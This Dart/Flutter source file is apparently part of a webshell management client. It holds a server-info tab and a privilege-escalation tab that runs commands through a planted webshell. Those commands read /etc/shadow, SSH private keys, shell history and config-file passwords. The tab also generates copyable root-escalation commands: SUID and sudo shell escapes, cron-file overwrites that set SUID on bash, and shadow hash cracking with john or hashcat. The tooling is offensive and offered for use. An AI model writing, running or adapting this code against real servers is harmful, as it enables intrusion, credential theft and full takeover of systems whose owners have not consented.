import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../services/webshell_service.dart';
import '../theme/app_theme.dart';
import '../app/localization.dart';

// ─── 系统信息 Tab ─────────────────────────────────────────────────────────────

class SystemInfoTab extends StatefulWidget {
  final WebshellService service;

  const SystemInfoTab({super.key, required this.service});

  @override
  State<SystemInfoTab> createState() => _SystemInfoTabState();
}

class _SystemInfoTabState extends State<SystemInfoTab>
    with AutomaticKeepAliveClientMixin {
  Map<String, String> _info = {};
  bool _loading = true;
  bool _failed = false;

  @override
  bool get wantKeepAlive => true;

  @override
  void initState() {
    super.initState();
    _load();
  }

  Future<void> _load() async {
    setState(() {
      _loading = true;
      _failed = false;
    });
    final info = await widget.service.getSystemInfo();
    if (mounted) {
      setState(() {
        _info = info;
        _loading = false;
        _failed = info.isEmpty;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    super.build(context);
    return Column(
      children: [
        // 工具栏
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
          color: AppColors.bgElevated,
          child: Row(
            children: [
              const Icon(
                Icons.dns_outlined,
                color: AppColors.primary,
                size: 16,
              ),
              const SizedBox(width: 8),
              Text(
                S.serverInfo,
                style: AppTextStyles.heading(
                  size: 14,
                  color: AppColors.primary,
                ),
              ),
              const Spacer(),
              TextButton.icon(
                onPressed: _loading ? null : _load,
                icon: const Icon(Icons.refresh, size: 15),
                label: Text(S.actionRefresh),
                style: TextButton.styleFrom(
                  foregroundColor: AppColors.textSecondary,
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: _loading
              ? const Center(
                  child: CircularProgressIndicator(color: AppColors.primary),
                )
              : _failed
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Icon(
                        Icons.error_outline,
                        color: AppColors.red,
                        size: 48,
                      ),
                      const SizedBox(height: 16),
                      Text(
                        S.sysInfoFailed,
                        style: AppTextStyles.body(
                          color: AppColors.textSecondary,
                        ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        S.sysInfoFailedHint,
                        style: AppTextStyles.caption(
                          color: AppColors.textMuted,
                        ),
                      ),
                      const SizedBox(height: 20),
                      FilledButton.icon(
                        onPressed: _load,
                        icon: const Icon(Icons.refresh, size: 16),
                        label: Text(S.btnRetry),
                        style: FilledButton.styleFrom(
                          backgroundColor: AppColors.primary,
                          foregroundColor: AppColors.bgDark,
                        ),
                      ),
                    ],
                  ),
                )
              : SingleChildScrollView(
                  padding: const EdgeInsets.all(20),
                  child: Column(
                    children: [
                      // 主要信息卡
                      _InfoGrid(info: _info),
                      const SizedBox(height: 20),
                      // 禁用函数
                      if (_info['禁用函数'] != null && _info['禁用函数'] != '无')
                        _DisabledFunctionsCard(functions: _info['禁用函数']!),
                      // 扩展列表
                      if (_info['已加载扩展'] != null)
                        _ExtensionsCard(extensions: _info['已加载扩展']!),
                    ],
                  ),
                ),
        ),
      ],
    );
  }
}

class _InfoGrid extends StatelessWidget {
  final Map<String, String> info;

  const _InfoGrid({required this.info});

  static const _mainKeys = [
    'OS',
    'PHP版本',
    '运行用户',
    '服务器IP',
    '服务器软件',
    '文档根目录',
    '当前目录',
    '内存限制',
    '最大执行时间',
    'Safe Mode',
  ];

  @override
  Widget build(BuildContext context) {
    final items = _mainKeys
        .where((k) => info.containsKey(k))
        .map((k) => MapEntry(k, info[k]!))
        .toList();

    return Container(
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        children: items.map((e) {
          final isLast = e == items.last;
          return Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            decoration: BoxDecoration(
              border: isLast
                  ? null
                  : const Border(bottom: BorderSide(color: AppColors.border)),
            ),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                SizedBox(
                  width: 120,
                  child: Text(
                    e.key,
                    style: AppTextStyles.caption(
                      size: 12,
                      color: AppColors.textSecondary,
                    ),
                  ),
                ),
                Expanded(
                  child: SelectableText(
                    e.value,
                    style: AppTextStyles.body(
                      size: 13,
                      color: AppColors.textPrimary,
                    ),
                  ),
                ),
              ],
            ),
          );
        }).toList(),
      ),
    );
  }
}

class _DisabledFunctionsCard extends StatelessWidget {
  final String functions;

  const _DisabledFunctionsCard({required this.functions});

  @override
  Widget build(BuildContext context) {
    final funcs = functions
        .split(',')
        .map((f) => f.trim())
        .where((f) => f.isNotEmpty)
        .toList();
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.red.withValues(alpha: 0.4)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.block, color: AppColors.red, size: 16),
              const SizedBox(width: 8),
              Text(
                S.disabledFunctions(funcs.length),
                style: AppTextStyles.body(size: 13, color: AppColors.red),
              ),
            ],
          ),
          const SizedBox(height: 10),
          Wrap(
            spacing: 6,
            runSpacing: 6,
            children: funcs
                .map(
                  (f) => Container(
                    padding: const EdgeInsets.symmetric(
                      horizontal: 8,
                      vertical: 3,
                    ),
                    decoration: BoxDecoration(
                      color: AppColors.red.withValues(alpha: 0.1),
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(
                        color: AppColors.red.withValues(alpha: 0.4),
                      ),
                    ),
                    child: Text(
                      f,
                      style: AppTextStyles.caption(
                        size: 11,
                        color: AppColors.red,
                      ),
                    ),
                  ),
                )
                .toList(),
          ),
        ],
      ),
    );
  }
}

class _ExtensionsCard extends StatelessWidget {
  final String extensions;

  const _ExtensionsCard({required this.extensions});

  @override
  Widget build(BuildContext context) {
    final exts =
        extensions
            .split(',')
            .map((e) => e.trim())
            .where((e) => e.isNotEmpty)
            .toList()
          ..sort();
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(
                Icons.extension_outlined,
                color: AppColors.primary,
                size: 16,
              ),
              const SizedBox(width: 8),
              Text(
                S.loadedExtensions(exts.length),
                style: AppTextStyles.body(size: 13, color: AppColors.primary),
              ),
            ],
          ),
          const SizedBox(height: 10),
          Wrap(
            spacing: 6,
            runSpacing: 6,
            children: exts
                .map(
                  (e) => Container(
                    padding: const EdgeInsets.symmetric(
                      horizontal: 8,
                      vertical: 3,
                    ),
                    decoration: BoxDecoration(
                      color: AppColors.primary.withValues(alpha: 0.08),
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(
                        color: AppColors.primary.withValues(alpha: 0.3),
                      ),
                    ),
                    child: Text(
                      e,
                      style: AppTextStyles.caption(
                        size: 11,
                        color: AppColors.primary,
                      ),
                    ),
                  ),
                )
                .toList(),
          ),
        ],
      ),
    );
  }
}

// ─── 提权 Tab ─────────────────────────────────────────────────────────────────

class _PrivEscSuggestion {
  final String title;
  final String reason;
  final List<String> commands;

  /// true = 条件已自动验证，执行建议命令可 100% 提权
  final bool verified;
  const _PrivEscSuggestion({
    required this.title,
    required this.reason,
    required this.commands,
    this.verified = true,
  });
}

class _PrivEscItem {
  final String id;
  final String name;
  final String command;
  final String description;
  const _PrivEscItem({
    required this.id,
    required this.name,
    required this.command,
    required this.description,
  });
}

class _PrivEscGroup {
  final String id;
  final String title;
  final IconData icon;
  final Color color;
  final List<_PrivEscItem> items;
  const _PrivEscGroup({
    required this.id,
    required this.title,
    required this.icon,
    required this.color,
    required this.items,
  });
}

class PrivEscTab extends StatefulWidget {
  final WebshellService service;
  const PrivEscTab({super.key, required this.service});

  @override
  State<PrivEscTab> createState() => _PrivEscTabState();
}

class _PrivEscTabState extends State<PrivEscTab>
    with AutomaticKeepAliveClientMixin {
  final Map<String, String?> _results = {};
  final Map<String, bool> _running = {};
  bool _runningAll = false;

  static List<_PrivEscGroup> get _groups => [
    _PrivEscGroup(
      id: 'current_priv',
      title: S.privEscGroupCurrentPriv,
      icon: Icons.person_outline,
      color: AppColors.primary,
      items: [
        _PrivEscItem(
          id: 'user_group',
          name: S.privEscItemUserGroup,
          command: 'id && whoami',
          description: S.privEscItemUserGroupDesc,
        ),
        _PrivEscItem(
          id: 'sudo',
          name: S.privEscItemSudo,
          command: 'sudo -l 2>&1',
          description: S.privEscItemSudoDesc,
        ),
        _PrivEscItem(
          id: 'env',
          name: S.privEscItemEnv,
          command: 'env 2>/dev/null',
          description: S.privEscItemEnvDesc,
        ),
      ],
    ),
    _PrivEscGroup(
      id: 'sys_info',
      title: S.privEscGroupSysInfo,
      icon: Icons.computer_outlined,
      color: AppColors.cyan,
      items: [
        _PrivEscItem(
          id: 'kernel',
          name: S.privEscItemKernel,
          command: 'uname -a',
          description: S.privEscItemKernelDesc,
        ),
        _PrivEscItem(
          id: 'distro',
          name: S.privEscItemDistro,
          command:
              'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null',
          description: S.privEscItemDistroDesc,
        ),
        _PrivEscItem(
          id: 'logged_users',
          name: S.privEscItemLoggedUsers,
          command: 'w 2>/dev/null || who 2>/dev/null',
          description: S.privEscItemLoggedUsersDesc,
        ),
        _PrivEscItem(
          id: 'root_procs',
          name: S.privEscItemRootProcs,
          command: 'ps aux 2>/dev/null | grep "^root" | head -20',
          description: S.privEscItemRootProcsDesc,
        ),
      ],
    ),
    _PrivEscGroup(
      id: 'esc_vectors',
      title: S.privEscGroupEscVectors,
      icon: Icons.security_outlined,
      color: const Color(0xFFFF9800),
      items: [
        _PrivEscItem(
          id: 'suid',
          name: S.privEscItemSuid,
          command: r'find / -perm -4000 -type f 2>/dev/null | head -30',
          description: S.privEscItemSuidDesc,
        ),
        _PrivEscItem(
          id: 'sgid',
          name: S.privEscItemSgid,
          command: r'find / -perm -2000 -type f 2>/dev/null | head -20',
          description: S.privEscItemSgidDesc,
        ),
        _PrivEscItem(
          id: 'capabilities',
          name: S.privEscItemCap,
          command: 'getcap -r / 2>/dev/null',
          description: S.privEscItemCapDesc,
        ),
        _PrivEscItem(
          id: 'cron',
          name: S.privEscItemCron,
          command:
              'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
          description: S.privEscItemCronDesc,
        ),
        _PrivEscItem(
          id: 'cron_writable',
          name: S.privEscItemCronWritable,
          command:
              r'find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /var/spool/cron \( -type f -o -type l \) 2>/dev/null -exec sh -c "m=$(stat -c \"%a\" \"$1\" 2>/dev/null);u=$(stat -c \"%u\" \"$1\" 2>/dev/null);g=$(stat -c \"%g\" \"$1\" 2>/dev/null);myu=$(id -u);o=$((m/100));gr=$((m/10%10));t=$((m%10));[ $((t&2)) -ne 0 ] && echo \"$1\";[ \"$u\" = \"$myu\" ] && [ $((o&2)) -ne 0 ] && echo \"$1\";id -G | tr \" \" \"\n\" | grep -q \"^${g}$\" && [ $((gr&2)) -ne 0 ] && echo \"$1\"" _ {} \;',
          description: S.privEscItemCronWritableDesc,
        ),
        _PrivEscItem(
          id: 'writable_dirs',
          name: S.privEscItemWritableDirs,
          command:
              r"find / -writable -type d 2>/dev/null | grep -Ev '/proc|/sys|/dev|/run' | head -20",
          description: S.privEscItemWritableDirsDesc,
        ),
        _PrivEscItem(
          id: 'path_hijack',
          name: S.privEscItemPathHijack,
          command:
              r'echo $PATH && find $(echo $PATH | tr ":" " ") -writable 2>/dev/null',
          description: S.privEscItemPathHijackDesc,
        ),
      ],
    ),
    _PrivEscGroup(
      id: 'sensitive_info',
      title: S.privEscGroupSensitiveInfo,
      icon: Icons.key_outlined,
      color: AppColors.red,
      items: [
        _PrivEscItem(
          id: 'loginable_accounts',
          name: S.privEscItemLoginableAccounts,
          command:
              r"cat /etc/passwd | grep -Ev 'nologin|false|sync|halt|shutdown'",
          description: S.privEscItemLoginableAccountsDesc,
        ),
        _PrivEscItem(
          id: 'shadow',
          name: S.privEscItemShadow,
          command: 'cat /etc/shadow 2>/dev/null',
          description: S.privEscItemShadowDesc,
        ),
        _PrivEscItem(
          id: 'history',
          name: S.privEscItemHistory,
          command:
              'cat ~/.bash_history 2>/dev/null || cat ~/.zsh_history 2>/dev/null | head -40',
          description: S.privEscItemHistoryDesc,
        ),
        _PrivEscItem(
          id: 'ssh_keys',
          name: S.privEscItemSshKeys,
          command:
              'ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null | head -5',
          description: S.privEscItemSshKeysDesc,
        ),
        _PrivEscItem(
          id: 'config_passwords',
          name: S.privEscItemConfigPasswords,
          command:
              r"grep -rls 'password\|passwd\|pass=' /var/www /etc 2>/dev/null | head -10 | xargs grep -h 'password\|passwd' 2>/dev/null | grep -v '^#' | head -20",
          description: S.privEscItemConfigPasswordsDesc,
        ),
      ],
    ),
  ];

  String _key(String group, String item) => '$group/$item';

  Future<void> _runCheck(_PrivEscGroup group, _PrivEscItem item) async {
    final key = _key(group.id, item.id);
    setState(() => _running[key] = true);
    try {
      final out = await widget.service.executeCommand(item.command);
      if (mounted) {
        setState(() {
          _results[key] = out.trim().isEmpty ? S.noOutput : out.trim();
          _running[key] = false;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _results[key] = S.errorResult(e);
          _running[key] = false;
        });
      }
    }
  }

  Future<void> _runAll() async {
    setState(() => _runningAll = true);
    for (final g in _groups) {
      for (final item in g.items) {
        await _runCheck(g, item);
      }
    }
    if (mounted) setState(() => _runningAll = false);
  }

  void _clearAll() => setState(() {
    _results.clear();
    _running.clear();
  });

  /// 根据检查结果分析并生成提权建议（解析实际路径/命令，提高准确性）
  List<_PrivEscSuggestion> _analyzeResults() {
    final suggestions = <_PrivEscSuggestion>[];
    String res(String g, String i) => _results[_key(g, i)] ?? '';

    // 1. Sudo 提权
    final sudo = res('current_priv', 'sudo');
    if (sudo.isNotEmpty &&
        !sudo.contains('Permission denied') &&
        sudo.contains('NOPASSWD')) {
      if (sudo.contains('(ALL)') || sudo.contains('ALL')) {
        suggestions.add(
          _PrivEscSuggestion(
            title: S.privEscSudoAllTitle,
            reason: S.privEscSudoAllReason,
            commands: ['sudo su', 'sudo -i', 'sudo bash'],
          ),
        );
      } else {
        // 解析 sudo -l 输出中的具体命令路径
        final cmdMatches = RegExp(
          r'NOPASSWD:\s*([^\s,]+)',
          multiLine: true,
        ).allMatches(sudo);
        final paths = cmdMatches
            .map((m) => m.group(1)?.trim())
            .whereType<String>()
            .where((s) => s.startsWith('/'))
            .toSet()
            .toList();
        final cmds = <String>[];
        for (final p in paths.take(5)) {
          final base = p.split('/').last.split('.').first.toLowerCase();
          if (base.contains('find')) {
            cmds.add('sudo $p . -exec /bin/sh -p \\; -quit');
          } else if (base.contains('vim') || base.contains('vi')) {
            cmds.add('sudo $p -c \':!/bin/sh\'');
          } else if (base.contains('python')) {
            cmds.add('sudo $p -c \'import os; os.execl("/bin/sh","sh","-p")\'');
          } else if (base.contains('perl')) {
            cmds.add('sudo $p -e \'exec "/bin/sh";\'');
          } else if (base.contains('nmap')) {
            cmds.add('sudo $p --interactive');
            cmds.add('# !sh');
          } else if (base.contains('awk')) {
            cmds.add('sudo $p \'BEGIN {system("/bin/sh -p")}\'');
          } else if (base.contains('less') || base.contains('more')) {
            cmds.add('sudo $p /etc/shadow');
            cmds.add('# !/bin/sh');
          } else {
            cmds.add('# $p → https://gtfobins.github.io');
          }
        }
        if (cmds.isEmpty) {
          cmds.add('# https://gtfobins.github.io');
        }
        suggestions.add(
          _PrivEscSuggestion(
            title: S.privEscSudoLimitedTitle,
            reason: S.privEscSudoLimitedReason(
              '${paths.take(3).join(", ")}${paths.length > 3 ? "…" : ""}',
            ),
            commands: cmds,
          ),
        );
      }
    }

    // 2. SUID 提权（解析实际路径，使用完整路径执行）
    final suid = res('esc_vectors', 'suid');
    if (suid.isNotEmpty &&
        suid != S.noOutput &&
        !suid.startsWith(S.logErrorTag)) {
      final pathRegex = RegExp(r'(/[^\s]+)');
      final paths = pathRegex
          .allMatches(suid)
          .map((m) => m.group(1)!)
          .where((p) => !p.contains('*'))
          .toSet()
          .toList();
      final cmds = <String>[];
      for (final path in paths.take(15)) {
        final base = path.split('/').last.toLowerCase();
        if (base.contains('find')) {
          cmds.add('cd /tmp && $path . -exec /bin/sh -p \\; -quit');
          break; // 一个足够
        }
      }
      if (cmds.isEmpty) {
        for (final path in paths.take(15)) {
          final base = path.split('/').last.toLowerCase();
          if (base.contains('vim') || base == 'vi') {
            cmds.add('$path -c \':!/bin/sh\'');
            break;
          }
        }
      }
      if (cmds.isEmpty) {
        for (final path in paths.take(15)) {
          final base = path.split('/').last.toLowerCase();
          if (base.contains('python')) {
            cmds.add('$path -c \'import os; os.execl("/bin/sh","sh","-p")\'');
            break;
          }
        }
      }
      if (cmds.isEmpty) {
        for (final path in paths.take(15)) {
          final base = path.split('/').last.toLowerCase();
          if (base.contains('nmap')) {
            cmds.add('$path --interactive');
            cmds.add('# !sh');
            break;
          }
        }
      }
      if (cmds.isEmpty) {
        for (final path in paths.take(15)) {
          final base = path.split('/').last.toLowerCase();
          if (base.contains('perl')) {
            cmds.add('$path -e \'exec "/bin/sh";\'');
            break;
          }
        }
      }
      if (cmds.isEmpty) {
        for (final path in paths.take(15)) {
          final base = path.split('/').last.toLowerCase();
          if (base == 'bash') {
            cmds.add('$path -p');
            break;
          }
        }
      }
      if (cmds.isNotEmpty) {
        suggestions.add(
          _PrivEscSuggestion(
            title: S.privEscSuidTitle,
            reason: S.privEscSuidReason,
            commands: cmds,
          ),
        );
      }
    }

    // 3. 内核 EXP（需本地查找 exploit，非 100%）
    final uname = res('sys_info', 'kernel');
    if (uname.isNotEmpty &&
        uname != S.noOutput &&
        !uname.startsWith(S.logErrorTag)) {
      final verMatch = RegExp(r'(\d+\.\d+\.\d+)').firstMatch(uname);
      final archMatch = RegExp(r'(x86_64|i686|aarch64|arm)').firstMatch(uname);
      if (verMatch != null) {
        final arch = archMatch?.group(1) ?? 'x86_64';
        suggestions.add(
          _PrivEscSuggestion(
            title: S.privEscKernelTitle,
            reason: S.privEscKernelReason(verMatch.group(1)!, arch),
            commands: [
              'searchsploit Linux Kernel ${verMatch.group(1)}',
              '# https://www.exploit-db.com/search?q=${Uri.encodeComponent('Linux Kernel ${verMatch.group(1)}')}',
            ],
            verified: false,
          ),
        );
      }
    }

    // 4. Shadow 破解（需本地破解，成功率取决于密码强度）
    final shadow = res('sensitive_info', 'shadow');
    if (shadow.isNotEmpty &&
        shadow != S.noOutput &&
        !shadow.startsWith(S.logErrorTag) &&
        !shadow.contains('Permission denied') &&
        RegExp(r'root:\$[156]\$').hasMatch(shadow)) {
      final hashMode = shadow.contains(r'$6$')
          ? ('1800', 'sha512crypt')
          : shadow.contains(r'$5$')
          ? ('7400', 'sha256crypt')
          : ('500', 'md5crypt');
      suggestions.add(
        _PrivEscSuggestion(
          title: S.privEscShadowTitle,
          reason: S.privEscShadowReason(hashMode.$2),
          commands: [
            'unshadow /etc/passwd /etc/shadow > hashes.txt',
            'john hashes.txt',
            '# hashcat: hashcat -m ${hashMode.$1} hashes.txt wordlist.txt',
          ],
          verified: false,
        ),
      );
    }

    // 5. Cron 脚本劫持（仅当检测到可写文件时建议，100% 可提权）
    final cronWritable = res('esc_vectors', 'cron_writable');
    if (cronWritable.isNotEmpty &&
        cronWritable != S.noOutput &&
        !cronWritable.startsWith(S.logErrorTag)) {
      final writablePaths = cronWritable
          .split('\n')
          .map((s) => s.trim())
          .where((s) => s.startsWith('/'))
          .toSet()
          .take(5)
          .toList();
      if (writablePaths.isNotEmpty) {
        final cmds = <String>[
          '# Create SUID payload, then overwrite writable cron files:',
          r"printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/_mx",
          ...writablePaths.map((p) => 'cp /tmp/_mx $p'),
          '# Wait for cron to run (usually within 1 min), then:',
          '/bin/bash -p',
        ];
        suggestions.add(
          _PrivEscSuggestion(
            title: S.privEscCronTitle,
            reason: S.privEscCronReason(
              '${writablePaths.take(2).join(", ")}${writablePaths.length > 2 ? "…" : ""}',
            ),
            commands: cmds,
          ),
        );
      }
    }

    // 5b. PATH 劫持（需等待命令被调用，非 100% 不加入主建议）

    // 6. Capabilities 提权（解析实际二进制路径）
    final cap = res('esc_vectors', 'capabilities');
    if (cap.isNotEmpty &&
        cap != S.noOutput &&
        !cap.startsWith(S.logErrorTag) &&
        cap.contains('cap_setuid')) {
      final paths = RegExp(r'(\S+)\s*=\s*.*cap_setuid')
          .allMatches(cap)
          .map((m) => m.group(1))
          .whereType<String>()
          .where((s) => s.startsWith('/'))
          .toSet()
          .take(5)
          .toList();
      final cmds = <String>[];
      if (paths.isNotEmpty) {
        for (final p in paths) {
          cmds.add('$p -p');
          cmds.add('# Or: $p --help');
        }
      } else {
        cmds.add('getcap -r / 2>/dev/null');
        cmds.add('# find cap_setuid binary then: /path/to/binary -p');
      }
      suggestions.add(
        _PrivEscSuggestion(
          title: S.privEscCapTitle,
          reason: S.privEscCapReason,
          commands: cmds,
        ),
      );
    }

    return suggestions;
  }

  @override
  bool get wantKeepAlive => true;

  @override
  Widget build(BuildContext context) {
    super.build(context);
    final doneCount = _results.length;
    final totalCount = _groups.fold(0, (s, g) => s + g.items.length);

    return Column(
      children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
          color: AppColors.bgElevated,
          child: Row(
            children: [
              const Icon(Icons.shield_outlined, color: AppColors.red, size: 16),
              const SizedBox(width: 8),
              Text(
                S.privEscTitle,
                style: AppTextStyles.heading(size: 14, color: AppColors.red),
              ),
              if (doneCount > 0) ...[
                const SizedBox(width: 8),
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 6,
                    vertical: 2,
                  ),
                  decoration: BoxDecoration(
                    color: AppColors.red.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: Text(
                    '$doneCount/$totalCount',
                    style: AppTextStyles.caption(
                      size: 11,
                      color: AppColors.red,
                    ),
                  ),
                ),
              ],
              const Spacer(),
              if (doneCount > 0)
                TextButton.icon(
                  onPressed: _runningAll ? null : _clearAll,
                  icon: const Icon(Icons.delete_sweep_outlined, size: 14),
                  label: Text(S.btnClear),
                  style: TextButton.styleFrom(
                    foregroundColor: AppColors.textSecondary,
                    padding: const EdgeInsets.symmetric(horizontal: 8),
                  ),
                ),
              const SizedBox(width: 4),
              FilledButton.icon(
                onPressed: _runningAll ? null : _runAll,
                icon: _runningAll
                    ? const SizedBox(
                        width: 12,
                        height: 12,
                        child: CircularProgressIndicator(
                          strokeWidth: 1.5,
                          color: Colors.white,
                        ),
                      )
                    : const Icon(Icons.play_arrow_rounded, size: 15),
                label: Text(_runningAll ? S.checkingAll : S.btnCheckAll),
                style: FilledButton.styleFrom(
                  backgroundColor: AppColors.red,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(
                    horizontal: 12,
                    vertical: 6,
                  ),
                  textStyle: AppTextStyles.body(size: 13),
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: Builder(
            builder: (context) {
              final suggestions = _analyzeResults()
                ..sort(
                  (a, b) => (b.verified ? 1 : 0).compareTo(a.verified ? 1 : 0),
                );
              return ListView(
                padding: const EdgeInsets.symmetric(
                  horizontal: 16,
                  vertical: 12,
                ),
                children: [
                  if (suggestions.isNotEmpty)
                    _PrivEscSuggestionsCard(
                      suggestions: suggestions,
                      onCopy: (cmd) {
                        Clipboard.setData(ClipboardData(text: cmd));
                        ScaffoldMessenger.of(context).showSnackBar(
                          SnackBar(
                            content: Text(S.snackCopied),
                            duration: const Duration(seconds: 1),
                            behavior: SnackBarBehavior.floating,
                          ),
                        );
                      },
                    ),
                  ..._groups.map(
                    (group) => _PrivEscGroupWidget(
                      group: group,
                      results: _results,
                      running: _running,
                      keyOf: _key,
                      onRun: (item) => _runCheck(group, item),
                    ),
                  ),
                ],
              );
            },
          ),
        ),
      ],
    );
  }
}

class _PrivEscSuggestionsCard extends StatelessWidget {
  final List<_PrivEscSuggestion> suggestions;
  final void Function(String) onCopy;

  const _PrivEscSuggestionsCard({
    required this.suggestions,
    required this.onCopy,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(bottom: 20),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppColors.primary.withValues(alpha: 0.06),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.primary.withValues(alpha: 0.35)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.lightbulb_outline, size: 18, color: AppColors.primary),
              const SizedBox(width: 8),
              Text(
                S.privEscSuggestions,
                style: AppTextStyles.heading(
                  size: 14,
                  color: AppColors.primary,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          ...suggestions.map(
            (s) => Padding(
              padding: const EdgeInsets.only(bottom: 12),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: Text(
                          s.title,
                          style: AppTextStyles.body(
                            size: 13,
                            color: AppColors.textPrimary,
                          ).copyWith(fontWeight: FontWeight.w600),
                        ),
                      ),
                      if (s.verified)
                        Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 6,
                            vertical: 2,
                          ),
                          decoration: BoxDecoration(
                            color: AppColors.primary.withValues(alpha: 0.2),
                            borderRadius: BorderRadius.circular(4),
                          ),
                          child: Text(
                            '100%',
                            style: AppTextStyles.caption(
                              size: 10,
                              color: AppColors.primary,
                            ),
                          ),
                        ),
                    ],
                  ),
                  const SizedBox(height: 2),
                  Text(
                    s.reason,
                    style: AppTextStyles.caption(
                      size: 11,
                      color: AppColors.textMuted,
                    ),
                  ),
                  const SizedBox(height: 6),
                  ...s.commands.map((cmd) {
                    final isComment = cmd.startsWith('#');
                    return Padding(
                      padding: const EdgeInsets.only(bottom: 4),
                      child: Row(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Expanded(
                            child: Container(
                              padding: const EdgeInsets.symmetric(
                                horizontal: 8,
                                vertical: 6,
                              ),
                              decoration: BoxDecoration(
                                color: isComment
                                    ? AppColors.bgDark
                                    : AppColors.bgCard,
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(
                                  color: isComment
                                      ? AppColors.border
                                      : AppColors.primary.withValues(
                                          alpha: 0.3,
                                        ),
                                ),
                              ),
                              child: SelectableText(
                                cmd,
                                style: TextStyle(
                                  fontFamily: 'Monaco',
                                  fontFamilyFallback: const [
                                    'Courier New',
                                    'monospace',
                                  ],
                                  fontSize: 11,
                                  color: isComment
                                      ? AppColors.textMuted
                                      : AppColors.cyan,
                                ),
                              ),
                            ),
                          ),
                          if (!isComment) ...[
                            const SizedBox(width: 6),
                            IconButton(
                              onPressed: () => onCopy(cmd),
                              icon: const Icon(Icons.copy_outlined, size: 16),
                              style: IconButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                padding: const EdgeInsets.all(4),
                                minimumSize: const Size(28, 28),
                              ),
                              tooltip: S.actionCopy,
                            ),
                          ],
                        ],
                      ),
                    );
                  }),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _PrivEscGroupWidget extends StatelessWidget {
  final _PrivEscGroup group;
  final Map<String, String?> results;
  final Map<String, bool> running;
  final String Function(String, String) keyOf;
  final void Function(_PrivEscItem) onRun;

  const _PrivEscGroupWidget({
    required this.group,
    required this.results,
    required this.running,
    required this.keyOf,
    required this.onRun,
  });

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.only(bottom: 8),
            child: Row(
              children: [
                Icon(group.icon, size: 14, color: group.color),
                const SizedBox(width: 6),
                Text(
                  group.title,
                  style: AppTextStyles.heading(size: 13, color: group.color),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Divider(
                    color: group.color.withValues(alpha: 0.25),
                    height: 1,
                  ),
                ),
              ],
            ),
          ),
          ...group.items.map((item) {
            final key = keyOf(group.id, item.id);
            return _PrivEscItemWidget(
              item: item,
              color: group.color,
              isRunning: running[key] == true,
              result: results[key],
              onRun: () => onRun(item),
            );
          }),
        ],
      ),
    );
  }
}

class _PrivEscItemWidget extends StatelessWidget {
  final _PrivEscItem item;
  final Color color;
  final bool isRunning;
  final String? result;
  final VoidCallback onRun;

  const _PrivEscItemWidget({
    required this.item,
    required this.color,
    required this.isRunning,
    required this.result,
    required this.onRun,
  });

  @override
  Widget build(BuildContext context) {
    final hasResult = result != null;
    final isError = result?.startsWith(S.logErrorTag) == true;
    final isNoOutput = result == S.noOutput;

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: hasResult
              ? (isError
                    ? AppColors.red.withValues(alpha: 0.4)
                    : color.withValues(alpha: 0.3))
              : AppColors.border,
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
